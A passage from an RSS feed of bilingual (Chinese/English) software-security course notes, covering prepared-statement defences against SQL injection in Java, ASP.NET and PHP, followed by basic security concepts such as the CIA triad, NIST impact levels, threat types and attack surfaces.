class=&#34;variable&#34;&gt;ps&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; db.prepareStatement(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT pizza, toppings, quantity, &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  order_day FROM orders WHERE userid=? &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;  AND order_month=?&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ps.setInt(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, session.getCurrentUserId());&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ps.setInt(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;, Integer.parseInt(request.getParameter(&lt;span class=&#34;string&#34;&gt;&amp;quot;month&amp;quot;&lt;/span&gt;)));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;ResultSet&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;res&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; ps.executeQuery();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;使用预处理语句 (PreparedStatement)&lt;br&gt;
 &lt;code&gt;PreparedStatement&lt;/code&gt;  是 Java 中用于执行预编译的 SQL 语句的对象，它确保 SQL 查询结构和输入数据的分离。在此代码中，使用  &lt;code&gt;?&lt;/code&gt;  占位符来标记用户输入的位置，确保输入的数据不被解释为 SQL 控制逻辑。&lt;/li&gt;
&lt;li&gt;绑定变量&lt;br&gt;
通过  &lt;code&gt;ps.setInt(1, ...)&lt;/code&gt;  和  &lt;code&gt;ps.setInt(2, ...)&lt;/code&gt;  方法，将 &lt;code&gt;用户 ID&lt;/code&gt;  和 &lt;code&gt;月份&lt;/code&gt; 参数绑定到相应的占位符上。&lt;br&gt;
绑定的变量具有明确的类型（如 int、String 等），这确保了输入数据不会改变 SQL 查询的逻辑。&lt;/li&gt;
&lt;/ul&gt;
 &lt;figure class=&#34;highlight csharp&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Prepared Statement: ASP.NET&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;SqlCommand cmd = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; SqlCommand(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT * FROM UserTable &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;   WHERE username = @User AND password = @Pwd&amp;quot;&lt;/span&gt;, &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   dbConnection&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; cmd.Parameters.Add(&lt;span class=&#34;string&#34;&gt;&amp;quot;@User&amp;quot;&lt;/span&gt;, Request[&lt;span class=&#34;string&#34;&gt;&amp;quot;user&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; cmd.Parameters.Add(&lt;span class=&#34;string&#34;&gt;&amp;quot;@Pwd&amp;quot;&lt;/span&gt;, Request[&lt;span class=&#34;string&#34;&gt;&amp;quot;pwd&amp;quot;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; cmd.ExecuteReader();&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;查询语句中的  &lt;code&gt;@User&lt;/code&gt;  和  &lt;code&gt;@Pwd&lt;/code&gt;  是参数占位符，用于标记用户输入的位置。&lt;figure class=&#34;highlight php&#34;&gt;&lt;figcaption&gt;&lt;span&gt;Prepared Statement: PHP&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_connect&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;getServer&lt;/span&gt;(), &lt;span class=&#34;title function_ invoke__&#34;&gt;getUid&lt;/span&gt;(), &lt;span class=&#34;title function_ invoke__&#34;&gt;getPwd&lt;/span&gt;()); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt; = &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_prepare&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$db&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;SELECT ccnum FROM cust WHERE id = ?&amp;quot;&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$HTTP_GET_VARS&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;quot;id&amp;quot;&lt;/span&gt;]; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;// 仅允许有效的ID（1-8位数字）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/^\d&amp;#123;1,8&amp;#125;$/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt;)) &amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_stmt_bind_param&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;s&amp;quot;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$id&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_stmt_execute&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_stmt_bind_result&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$result&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;mysqli_stmt_fetch&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$stmt&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;SQL 查询中使用  &lt;code&gt;?&lt;/code&gt;  作为占位符，表示参数的位置&lt;/li&gt;
&lt;li&gt;使用正则表达式  &lt;code&gt;preg_match(&#39;/^\d&amp;#123;1,8&amp;#125;$/&#39;, $id)&lt;/code&gt;  来验证用户输入。这确保了输入是 1 到 8 位的数字，过滤掉了潜在的恶意输入&lt;/li&gt;
&lt;li&gt;使用  &lt;code&gt;mysqli_stmt_bind_param($stmt, &amp;quot;s&amp;quot;, $id)&lt;/code&gt;  方法将用户输入的 ID 作为参数绑定到预处理语句中。参数类型  &lt;code&gt;s&lt;/code&gt;  指定绑定的变量是字符串类型（string）。&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Fixing SQL Injections&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Validate all input&lt;/li&gt;
&lt;li&gt;Never use string concatenation to build SQL statements&lt;/li&gt;
&lt;li&gt;Use parameterised stored procedures or other functions for database access&lt;/li&gt;
&lt;li&gt;Use least privileged accounts to connect to the database&lt;/li&gt;
&lt;li&gt;Remove access to all user defined tables and grant access only to stored procedures&lt;/li&gt;
&lt;/ul&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/course/Security-Concepts/</guid>
            <title>Security Concepts</title>
            <link>http://example.com/course/Security-Concepts/</link>
            <category>software security</category>
            <pubDate>Wed, 30 Oct 2024 10:32:09 +1000</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34; Computer Security Concepts&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;# Computer Security Concepts&#34;&gt;#&lt;/a&gt; Computer Security Concepts &lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;A Definition of Computer Security&lt;br&gt;
Computer Security is the protection afforded to an automated information system in order to attain the applicable objectives of preserving the &lt;strong&gt;integrity&lt;/strong&gt;, &lt;strong&gt;availability&lt;/strong&gt;, and &lt;strong&gt;confidentiality&lt;/strong&gt; of information system resources (includes hardware, software, firmware, information/data, and telecommunications)
&lt;ul&gt;
&lt;li&gt;Confidentiality&lt;br&gt;
&lt;strong&gt;Data confidentiality&lt;/strong&gt; assures that private or confidential information is not made available or disclosed to unauthorised individuals&lt;br&gt;
&lt;strong&gt;Privacy&lt;/strong&gt; assures that individuals control or influence what information related to them may be collected and stored and by whom and to whom that information may be disclosed&lt;/li&gt;
&lt;li&gt;Integrity&lt;br&gt;
&lt;strong&gt;Data integrity&lt;/strong&gt; assures that information and programs are changed only in a specified and authorised manner&lt;br&gt;
&lt;strong&gt;System integrity&lt;/strong&gt; assures that a system performs its intended function in an unimpaired manner, free from deliberate or inadvertent unauthorised manipulation of the system&lt;/li&gt;
&lt;li&gt;Availability&lt;br&gt;
&lt;strong&gt;Availability assures&lt;/strong&gt; that systems work promptly and service is not denied to authorised users&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CIA Triad (NIST standard FIPS 199)&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Confidentiality&lt;/strong&gt; preserves authorised restrictions on information access and disclosure, including means for protecting personal privacy and proprietary information
&lt;ul&gt;
&lt;li&gt;A loss of confidentiality is the unauthorised disclosure of information&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Integrity&lt;/strong&gt; guards against improper information modification or destruction, including ensuring information nonrepudiation and authenticity
&lt;ul&gt;
&lt;li&gt;A loss of integrity is the unauthorised modification or destruction of information&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Availability&lt;/strong&gt; ensures timely and reliable access to and use of information
&lt;ul&gt;
&lt;li&gt;A loss of availability is the disruption of access to or use of information or a system&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Additional Concepts
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Authenticity&lt;/strong&gt; is the property of being genuine and being able to be verified and trusted; confidence in the validity of a transmission, a message, or message originator (真实性）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Accountability&lt;/strong&gt; is the security goal that generates the requirement for actions of an entity to be traced uniquely to that entity（可追溯性）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;NIST Levels of Security Impact&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Low&lt;/strong&gt; when the loss is expected to have a limited adverse effect. E.g. reduced effectiveness, minor damage, financial loss or harm&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Moderate&lt;/strong&gt; when the loss is expected to have a serious adverse effect. E.g. Significant reduced effectiveness, damage, financial loss or harm (but does not involve loss of life or serious injuries)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;High&lt;/strong&gt; when the loss is expected to have a severe or catastrophic adverse effect. E.g. unable to perform primary functions, major damage, and financial loss, involve loss of life or serious injuries&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;CIA Triad Examples&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Confidentiality&lt;br&gt;
High: student grades&lt;br&gt;
Moderate: enrolment information&lt;br&gt;
Low: faculty directory information&lt;/li&gt;
&lt;li&gt;Integrity&lt;br&gt;
High: patient allergy information&lt;br&gt;
Moderate: web site like online forums&lt;br&gt;
Low: anonymous online poll&lt;/li&gt;
&lt;li&gt;Availability&lt;br&gt;
High: authentication services&lt;br&gt;
Moderate: public web site for a university&lt;br&gt;
Low: online telephone directory lookup application&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Computer Security Terminology&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Adversary&lt;/strong&gt; (threat agent) is an entity that attacks, or is a threat to, a system&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Attack&lt;/strong&gt; is an assault on system security that derives from an intelligent threat; that is, an intelligent act that is a deliberate attempt (especially in the sense of a method or technique) to evade security services and violate the security policy of a system&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Countermeasure&lt;/strong&gt; is an action, device, procedure, or technique that reduces a threat, a vulnerability, or an attack by eliminating or preventing it, by minimising the harm it can cause, or by discovering and reporting it so that corrective action can be taken&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Risk&lt;/strong&gt; is an expectation of loss expressed as the probability that a particular threat will exploit a particular vulnerability with a particular harmful result&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Security Policy&lt;/strong&gt; is the set of rules and practices that specify or regulate how a system or organisation provides security services to protect sensitive and critical system resources&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;System Resource (Asset)&lt;/strong&gt; is the data contained in an information system; or a service provided by a system; or a system capability, such as processing power or communication bandwidth; or an item of system equipment; or a facility that houses system operations and equipment&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Threat&lt;/strong&gt; is a potential for violation of security, which exists when there is a circumstance, capability, action, or event, that could breach security and cause harm&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Vulnerability&lt;/strong&gt; is a flaw or weakness in a system’s design, implementation, or operation and management that could be exploited to violate the system’s security policy&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;Threats and Attacks&#34; class=&#34;active&#34;&gt;&lt;a class=&#34;anchor&#34;  href=&#34;#Threats and Attacks&#34;&gt;#&lt;/a&gt; Threats and Attacks&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;Assets&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hardware&lt;/strong&gt; includes computer systems and other data processing, data storage, and data communications devices&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Software&lt;/strong&gt; includes the operating system, system utilities, and applications&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Data&lt;/strong&gt; includes files and databases, as well as security-related data, such as password files&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Network&lt;/strong&gt; includes communication facilities such as local and wide area network communication links, bridges, routers, and so on&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;Vulnerabilities&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;It can be corrupted, so that it does the wrong thing or gives wrong answers (Integrity)
&lt;ul&gt;
&lt;li&gt;E.g. stored data values may differ from what they should be because they have been improperly modified&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;It can become leaky (Confidentiality)
&lt;ul&gt;
&lt;li&gt;E.g. someone who should not have access to some or all of the information available through the network obtains such access&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;It can become unavailable or very slow (Availability)
&lt;ul&gt;
&lt;li&gt;E.g. using the system or network becomes impossible or impractical.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;Threats&lt;br&gt;
An attack is a threat that is carried out and leads to threat consequence&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Types of attacks
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Active attack&lt;/strong&gt; attempts to alter system resources or affect their operation&lt;br&gt;
 示例：篡改数据、破坏系统功能、删除文件、拒绝服务攻击（DoS）等。&lt;br&gt;
影响：直接对系统资源进行修改或破坏，导致系统功能受损。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Passive attack&lt;/strong&gt; attempts to learn or make use of information from the system that does not affect system resources. Passive attacks are very difficult to detect because they do not involve any alteration of the data&lt;br&gt;
 示例：流量分析、数据包嗅探、解密通信等。&lt;br&gt;
影响：攻击者不会修改系统或数据，但可能会获得敏感信息或通信内容。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Origin of attacks
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Inside attack&lt;/strong&gt; is initiated by an entity inside the security perimeter&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Outside attack&lt;/strong&gt; is initiated from outside the perimeter&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;Threat Consequences&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;Attacks that Cause Unauthorised Disclosure&lt;br&gt;
&lt;strong&gt;Unauthorised disclosure&lt;/strong&gt; is a circumstance or event whereby an entity gains&lt;br&gt;
access to data for which the entity is not authorised
&lt;ol&gt;
&lt;li&gt;信息暴露（Exposure）&lt;br&gt;
定义：当内部人员故意或无意间将敏感信息（如信用卡号）泄露给外部人员时，就会发生信息暴露。&lt;br&gt;
示例：社交网站意外将用户的保密信息发布在网页上。&lt;br&gt;
解释：信息暴露可以是由于人为错误或系统配置不当导致的，常见于数据泄露事件。&lt;/li&gt;
&lt;li&gt;拦截（Interception）&lt;br&gt;
定义：这是基于网络的攻击，黑客通过网络监听获取电子邮件流量和其他数据传输内容。&lt;br&gt;
示例：数据包嗅探、网络流量窃听等。&lt;br&gt;
解释：拦截攻击通常通过网络中的中间人攻击（MITM）、不安全的无线连接或其他网络漏洞来实现。&lt;/li&gt;
&lt;li&gt;推理（Inference）&lt;br&gt;
定义：当攻击者通过观察网络流量模式或数据库访问模式而获得信息时，就会发生推理攻击。&lt;br&gt;
示例：流量分析可以通过检测流量的模式、时间或数量来推断信息的类型或内容。&lt;br&gt;
解释：推理攻击并不需要实际访问敏感信息，而是通过分析元数据或行为模式推测出信息。&lt;/li&gt;
&lt;li&gt;入侵（Intrusion）&lt;br&gt;
定义：当攻击者绕过系统的访问控制保护，获取对敏感数据的未经授权访问时，就会发生入侵。&lt;br&gt;
示例：通过漏洞利用、暴力破解或获取凭证绕过身份验证。&lt;br&gt;
解释：入侵攻击通常是通过直接破坏系统防线来访问或窃取敏感信息的。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Attacks that Cause Deception&lt;br&gt;
Deception is circumstance or event that may result in an authorised entity receiving false data and believing it to be true
&lt;ol&gt;
&lt;li&gt;伪装（Masquerade）&lt;br&gt;
定义：伪装是指未经授权的用户通过冒充授权用户来试图访问系统。&lt;br&gt;
解释：伪装攻击破坏了系统的身份验证机制，使得攻击者能够以合法用户的身份进行操作。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;未授权用户获取他人的 ID 和密码后冒充合法用户。&lt;/li&gt;
&lt;li&gt;恶意软件伪装成授权应用程序，获得对系统的未经授权的访问。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;篡改（Falsification）&lt;br&gt;
定义：篡改是指对有效数据进行更改或替换，或将虚假数据引入文件或数据库中。&lt;br&gt;
解释：篡改攻击涉及数据的非法修改，破坏了系统的 完整性（Integrity），导致数据不准确或不可靠。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;学生在学校数据库中修改自己的成绩。&lt;/li&gt;
&lt;li&gt;黑客更改金融交易记录或替换数据库中的敏感信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;否认（Repudiation）&lt;br&gt;
定义：否认是指用户否认发送或接收数据的行为。&lt;br&gt;
解释：否认攻击涉及通信或交易的不可否认性，影响了系统的可靠性和信任性。这种攻击通常需要通过数字签名、日志记录和不可否认性协议进行防御。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;用户声称没有发送某封电子邮件。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Attacks that Cause Disruption&lt;br&gt;
Disruption is a circumstance or event that interrupts or prevents the correct operation of system services and functions
&lt;ol&gt;
&lt;li&gt;瘫痪（Incapacitation）&lt;br&gt;
定义：瘫痪是一种针对系统可用性的攻击，其目的是通过物理破坏或恶意软件导致系统硬件或服务失效。&lt;br&gt;
解释：攻击者通过直接损坏硬件或利用恶意代码使系统关键组件无法工作，导致系统无法为用户提供正常的服务。这类攻击破坏了系统的 可用性（Availability）。&lt;br&gt;
示例：特洛伊木马、病毒或蠕虫导致关键服务失效，或使得系统硬件崩溃，阻止合法用户的正常访问。&lt;/li&gt;
&lt;li&gt;破坏（Corruption）&lt;br&gt;
定义：破坏是指通过恶意软件改变系统资源或服务的正常行为，从而使系统在非预期情况下运行。&lt;br&gt;
解释：攻击者通过篡改系统的数据、配置或功能，使得系统的行为不再可靠或准确。这种攻击影响了系统的 完整性（Integrity），导致数据不可信或系统功能受损。&lt;br&gt;
示例：黑客植入后门程序，使得系统提供了未授权的访问，或篡改了数据库中的关键数据，导致应用程序的行为异常。&lt;/li&gt;
&lt;li&gt;阻塞（Obstruction）&lt;br&gt;
定义：阻塞是一种干扰通信的攻击，通过禁用通信链路或篡改通信控制信息来影响系统的正常通信。&lt;br&gt;
解释：攻击者通过发送大量垃圾数据或篡改通信协议，使系统的网络或处理能力过载，从而影响合法用户的通信。这种攻击破坏了系统的 可用性（Availability） 和通信的有效性。&lt;br&gt;
示例：攻击者通过分布式拒绝服务攻击（DDoS）让网络流量超载，导致正常的通信被阻塞或延迟。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Attacks that Cause Usurpation&lt;br&gt;
Usurpation is a circumstance or event that results in control of system services or functions by an unauthorised entity
&lt;ol&gt;
&lt;li&gt;挪用（Misappropriation）&lt;br&gt;
定义：挪用是指攻击者未经授权使用或盗用系统资源或服务。&lt;br&gt;
解释：攻击者通过获取未授权的访问权限，利用系统的资源或服务，可能包括网络带宽、计算能力等。这种攻击对系统的 可用性（Availability） 和资源的公平分配构成威胁。&lt;br&gt;
示例：分布式拒绝服务（DDoS）攻击使得网络资源被耗尽，导致合法用户无法正常使用服务。&lt;/li&gt;
&lt;li&gt;滥用（Misuse）&lt;br&gt;
定义：滥用是指通过恶意逻辑或黑客手段，使系统被用于非授权的目的或偏离其正常用途。&lt;br&gt;
解释：攻击者可能通过植入恶意软件或获得未授权的系统访问，禁用或绕过安全功能，使系统无法保护其资源和数据的安全。这种攻击影响系统的 完整性（Integrity） 和 可用性（Availability）。&lt;br&gt;
示例：黑客绕过安全控制措施，使得防火墙规则被禁用，从而使系统易受进一步的攻击。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Threats and Assets&lt;/li&gt;
&lt;/ol&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Asset&lt;/th&gt;
&lt;th&gt;Availability&lt;/th&gt;
&lt;th&gt;Confidentiality&lt;/th&gt;
&lt;th&gt;Integrity&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Hardware&lt;/td&gt;
&lt;td&gt;Equipment is stolen or disabled, thus denying service&lt;/td&gt;
&lt;td&gt;An unencrypted HDD or CD/DVD is stolen&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Software&lt;/td&gt;
&lt;td&gt;Programs are deleted, denying access to users&lt;/td&gt;
&lt;td&gt;An unauthorised copy of software is made&lt;/td&gt;
&lt;td&gt;A working program is modified, either to cause it to fail during execution or to cause it to do some unintended task&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Data&lt;/td&gt;
&lt;td&gt;Files are deleted, denying access to users&lt;/td&gt;
&lt;td&gt;An unauthorised read of data is performed. An analysis of statistical data reveals underlying data&lt;/td&gt;
&lt;td&gt;Existing files are modified or new files are fabricated&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;Network&lt;/td&gt;
&lt;td&gt;Messages are destroyed or deleted. Communication lines or networks are rendered unavailable&lt;/td&gt;
&lt;td&gt;Messages are read. The traffic pattern of messages is observed&lt;/td&gt;
&lt;td&gt;Messages are modified, delayed, reordered, or duplicated. False messages are fabricated&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ol start=&#34;6&#34;&gt;
&lt;li&gt;Attack Surfaces
&lt;ol&gt;
&lt;li&gt;网络攻击面 (Network Attack Surface)&lt;br&gt;
 定义：网络攻击面是指企业网络、广域网或互联网中的各种漏洞，这些漏洞可能被攻击者利用。&lt;br&gt;
解释：攻击者可能通过网络层的漏洞，如服务中断、通信链路破坏等，来发起攻击。&lt;br&gt;
示例：
&lt;ul&gt;
&lt;li&gt;拒绝服务攻击 (DoS)：攻击者利用大量无效请求占用服务器资源，导致合法用户无法访问服务。&lt;/li&gt;
&lt;li&gt;通信链路中断：通过物理或网络手段破坏通信链路，从而阻止或干扰数据传输。&lt;br&gt;
入侵攻击：未经授权的用户通过网络漏洞进入系统，获取或修改敏感信息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;软件攻击面 (Software Attack Surface)&lt;br&gt;
 定义：软件攻击面是指应用程序或操作系统代码中的漏洞。&lt;br&gt;
